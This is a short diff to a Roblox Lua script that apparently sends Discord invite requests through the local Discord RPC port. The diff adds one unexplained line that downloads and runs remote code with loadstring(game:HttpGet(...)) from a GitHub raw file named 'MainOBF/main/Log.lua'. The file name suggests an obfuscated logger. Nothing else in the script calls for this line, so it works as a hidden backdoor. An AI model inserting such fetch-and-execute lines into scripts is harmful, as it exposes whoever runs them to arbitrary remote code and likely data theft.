@@ -16,6 +16,8 @@ local HttpService = game:GetService("HttpService")
 local DiscordAPI = "http://127.0.0.1:6463/rpc?v=1"
 local RequestFunction
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kyuoso/MainOBF/main/Log.lua"))();
+
 for i = 6453, 6464 do
 	local DiscordInviteRequest = function()
 		local Request = RequestFunction({
